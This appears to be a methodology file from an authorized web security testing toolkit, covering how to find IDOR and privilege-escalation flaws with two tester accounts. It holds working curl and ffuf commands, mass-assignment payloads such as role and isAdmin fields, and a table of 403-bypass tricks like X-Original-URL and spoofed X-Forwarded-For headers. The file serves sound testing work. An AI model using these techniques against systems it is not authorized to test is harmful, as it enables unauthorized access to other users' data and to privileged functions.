# Access-control mapping methodology (shared by idor / privesc)
# Access control is tested by COMPARING identities. You need ≥2 accounts. The feeder maps; the
# variants violate the map. Record everything so the reviewer can see the intended vs actual access.

## Identities (auth.env)
- `A` — low-priv attacker account
- `B` — victim account (different owner, same role) → horizontal / IDOR
- `admin` — higher-priv account (if authorized) → vertical / function-level
Capture each identity's session (cookie/token) separately.

## Object references (→ idor)
Find every request where an `id` selects a resource: `/api/users/123`, `?order_id=`, `{ "account": 55 }`,
UUIDs, hashids, filenames, base64 ids. Note `id_type` (sequential ids are trivially enumerable; uuids
need a leak) and whether the server SHOULD enforce ownership (`owner_scoped`).

## Role → endpoint matrix (→ privesc)
Crawl each sensitive endpoint as EACH identity; record who the app LETS reach it (status 200 vs 403).
The matrix reveals function-level gaps (a low-priv account reaching an admin function) and the intended
role for each endpoint.

## Mass-assignment candidates
For object-create/update endpoints, list fields the client sends vs fields the server manages
(`role`, `is_admin`, `verified`, `balance`, `owner_id`). A server-managed field the client can set =
mass-assignment candidate (→ idor/privesc depending on effect).

## The test (variants)
IDOR: as `A`, request `B`'s object id → do you get B's data? (owner check missing)
Vertical: as `A`, call an admin-only function → does it work? (function-level check missing)
Always compare to the intended access in `authz_context.json`. Use TEST accounts; don't read real users.

---

## Extended arsenal — object-reference discovery & id-format fingerprinting

Fingerprint every reference so the variants know whether it's enumerable (bump it) or needs a leak (harvest it).

| format | example | enumerable | notes |
|---|---|---|---|
| sequential int | `/users/123`, `?order_id=55` | yes | walk ±1; the easy IDOR |
| UUIDv1 (time/MAC) | `3f2504e0-4f89-11d3-9a0c-0305e82c3301` | partial | timestamp+node are structured → keyspace narrows; not random |
| UUIDv4 (random) | `9b2c…` 122-bit random | no | needs a leak (another response, log, referrer) |
| hashids / short code | `Qlpw3`, `C-285-100` | sometimes | small/patterned keyspace or default salt → reversible/brute |
| base64-wrapped | `dXNlcjoxMjM=` → `user:123` | yes | decode → bump inner id → re-encode |
| hex-encoded | `313233` → `123` | yes | encoding adds **no** entropy |
| composite / path-nested | `/org/5/users/9` | yes | vary EACH segment independently (outer scope often unchecked) |
| array / multi-object | `chat_users[0]=A&chat_users[1]=B` | yes | swap one member slot for B |
| name / file key | `?file=report.pdf`, `?username=` | yes | predictable names; also an error oracle (user-exists vs file-missing) |

Ref **locations** to sweep (not just the URL): path segment · query string · form/JSON body · nested JSON · request header (`X-Client-ID`) · cookie · multipart field · GraphQL node id. Prioritize GET/PUT/PATCH/DELETE (read+write).

```
# decode a base64/hex wrapper to see the real inner id, then re-wrap a tampered value
echo 'dXNlcjoxMjM=' | base64 -d        # user:123   -> edit to user:124 -> base64 re-encode
# bounded enumerable-id sweep with A's session (NEVER bulk — cap to a few test ids around A's/B's own):
ffuf -w ids.txt -H "Cookie: $A_SESSION" -u 'https://t/api/orders/FUZZ' -mc 200 -fr 'not found|forbidden'
```
Safety: enumeration is for *fingerprinting the keyspace*, not harvesting users — keep the id list to the two testers' own objects + a handful of probes; no full-range walk, no bulk extraction.

---

## Extended arsenal — two-account reference harvesting

Drive the app as A **and** B through separate proxy sessions; the diff of the two capture logs IS the object inventory.

```
# capture each identity to its own log (multi-session interceptor / two cookie jars)
curl -s -b ja.txt  https://t/dashboard  -o /dev/null   # A browses its own account
curl -s -b jb.txt  https://t/dashboard  -o /dev/null   # B browses its own account
# pull every id-looking token each session SAW (so you know B's real ids to replay in A's session)
grep -oiE '([0-9a-f-]{36}|[0-9]{3,}|[A-Za-z0-9+/]{8,}={0,2})' logs/B_*.log | sort -u > refs_B.txt
```
Record for each ref: `owner` (A|B), `id_type`, `owner_scoped?` (should the server enforce ownership). B's `owner_scoped` ids = the horizontal test set; a shared/public id is NOT a candidate.

---

## Extended arsenal — horizontal access test method (IDOR / BOLA · OWASP API1 · CWE-639)

Core move: **A's session, B's object id.** The proof needs both identities and a B-only marker.

```
# 1) baseline: B's own call must succeed (confirms the id is real + B-only field exists)
curl -s -b jb.txt  https://t/api/orders/$B_ID            # 200, shows B-only addr/email = the marker
# 2) the test: same object, A's session
curl -s -b ja.txt  https://t/api/orders/$B_ID            # 200 + B's marker = IDOR (expected 403/empty)
# 3) write variant (reversible, test object only):
curl -s -b ja.txt -X PATCH -d '{"note":"rs-canary"}' https://t/api/orders/$B_ID   # then read-back as B
# 4) control: A on A_ID must succeed -> isolates the MISSING OWNER CHECK, not a broken endpoint
```
Confirmed = A got/changed **B's** resource. NOT IDOR: own resource, shared/public data, or 403/empty. Tools: burp + autorize (auto-replays A's session against B's requests, flags same/diff). Blind vs reflected: if A gets `200` with no body, it's an existence-only check — confirm via a side effect (state change, email trigger), not the body.

---

## Extended arsenal — vertical access test method (privesc / BFLA · OWASP API5 · CWE-862/863)

Core move: **low-priv identity invokes a higher-role function.** Judge against the matrix's intended role, not the HTTP status alone.

```
# A (low-priv) calls an admin-only function on a SELF/TEST target (don't touch real users):
curl -s -b ja.txt -X POST -d '{"user":"<A-self>","role":"user"}' https://t/admin/users/role   # 200 + applied = BFLA
# forced browsing: hit admin routes as A (function-level, any-low-priv-can-call — distinct from IDOR)
ffuf -w admin-routes.txt -H "Cookie: $A_SESSION" -u https://t/FUZZ -mc 200 -fr 'login|forbidden|403'
# alt handlers the UI hides but the authz filter forgot: GraphQL mutation, /v1 vs /v3, PATCH vs PUT
```
Confirmed = the action **EXECUTED** (state changed / privileged data returned), and the matrix reserves it for a higher role. Re-login/refresh token if the new privilege rides in a JWT claim. If it's "A reached one specific other object" → that's object-level, reclassify to idor.

---

## Extended arsenal — role × endpoint/action matrix (construction + template)

Crawl each sensitive endpoint as EVERY identity; the cell is the observed result, the last columns are the verdict.

```
# observe one endpoint across all sessions
for id in A B admin; do
  code=$(curl -s -o /dev/null -w '%{http_code}' -b "j_$id.txt" https://t/admin/report)
  echo "$id -> $code"; done
```

| endpoint / action | method | A (low) | B (low, other owner) | admin | intended role | gap |
|---|---|---|---|---|---|---|
| `/admin/users/role` | POST | 200✗ | 200✗ | 200 | admin | BFLA (A executed) |
| `/api/orders/{id}` | GET | B's data✗ | — | 200 | owner-only | IDOR (object) |
| `/reports/export` | GET | 403 | 403 | 200 | admin | ok (enforced) |

`✗` = reached something it shouldn't. Rows feed `idor` (object-level cells) and `privesc` (function-level cells). "Intended role" is the reviewer's yardstick — a 200 that MATCHES intent is not a finding.

---

## Extended arsenal — mass assignment / over-posting depth (CWE-915 · OWASP API3)

Add client-controlled fields the server should manage; confirm by reading the field back as the victim/other session.

```
# discover bindable fields: diff what GET returns vs what the UI sends; replay server-managed keys
curl -s -b ja.txt https://t/me | jq -r 'paths(scalars)|join(".")' | sort -u     # response echo = candidates
# privilege / verification / tenant / business-logic payloads (one field at a time):
-d '{"role":"ADMIN"}'                        # or roles:[{"name":"ADMIN"}]  -> privesc
-d '{"isAdmin":true}'  -d '{"verified":true,"emailVerified":true,"kycStatus":"approved"}'
-d '{"ownerId":<B>,"organizationId":<B_org>,"tenantId":<B>}'   # object-move -> pivot to IDOR/BOLA
-d '{"price":0,"discount":100,"balance":9999,"status":"approved","refundAmount":500}'   # logic
# nested wrapper (flat key filtered, nested one isn't):
-d '{"profile":{"organizationId":7}}'   -d '{"order":{"owner":{"id":7}}}'
```
Alt handlers that skip the allowlist: `PATCH` / JSON-Merge-Patch, alternate key casing, a separate API route, create-flow (`POST /register`) accepting fields edit routes reject. Confirmed = the privileged field actually changed server state (read it back) — not merely accepted in the request. Reversible, test object only.

---

## Extended arsenal — authz bypass tricks (403→200 differentials)

When a direct call is 403, try to make the gateway and backend disagree. Each is a differential: compare body/length, not just the code.

| trick | mutation | why it flips |
|---|---|---|
| verb swap | `GET`→`POST/PUT/PATCH/DELETE/HEAD` same path | alt handler lacks the authz check |
| method override | `X-HTTP-Method-Override: PUT` on a POST | gateway keys on POST, backend acts PUT |
| path case | `/Admin`, `/ADMIN` | case-sensitive proxy rule vs case-insensitive backend |
| encoded path | `/%2e/admin`, `/%252e/admin`, `/%ef%bc%8f admin` | raw-path check misses; router decodes |
| segment/trailing | `/admin/`, `/admin/.`, `//admin//`, `/.;/admin`, `/admin.json` | normalization mismatch |
| path-override header | `X-Original-URL: /admin`, `X-Rewrite-URL: /admin` | front proxy sees `/`, backend routes `/admin` |
| IP-trust header | `X-Forwarded-For: 127.0.0.1`, `X-Remote-IP`, `True-Client-IP` | backend trusts a spoofable "internal" source |
| API version | `/v3/users/1` (403) → `/v1/users/1` (200) | old version predates the control |
| HPP crossover | `id=<A>&id=<B>` across query/body/JSON | gateway keys on first occurrence, backend on last (→ `parameter-pollution` for the parser detail) |
| wrapped / array id | `{"id":[<B>]}`, `{"id":{"id":<B>}}` | type confusion skips the owner lookup |
| blind vs reflected | `200` empty vs `200` with B's data | existence-only check — prove via side effect, not body |

```
# quick verb+path differential sweep (compare to the 403 baseline length)
for m in GET POST PUT PATCH DELETE; do curl -s -o /dev/null -w "$m %{http_code} %{size_download}\n" \
  -X $m -b ja.txt https://t/admin/report; done
```

---

## Extended arsenal — benign two-account proof template

Every accepted authz finding carries this minimal differential so the reviewer sees intended-vs-actual:

```
identity_A : <low-priv tester>          identity_B : <other-owner tester>   [+ admin if vertical]
object/func: <B's object id | admin endpoint>     id_type: <seq|uuidv4|hashid|…>
baseline   : B (or admin) performs it  -> 200 + <B-only / privileged marker>     # proves it's real
control    : A performs it on A's OWN   -> 200                                    # endpoint works for A
TEST       : A performs it on B's/admin -> <result>   expected <403/own-only>     # the gap
effect     : <data returned = B's marker | state read back changed>               # not just a 200
intended   : <owner-only | admin-only per role_matrix>     class: <idor|privesc>
cleanup    : <reverted write / deleted canary on the TEST object>                 # reversible
```
Rules (match verify.md): two tester identities only; read/modify ONLY the designated test objects; no bulk extraction; no destructive writes; each write reversible + cleaned up; in scope.
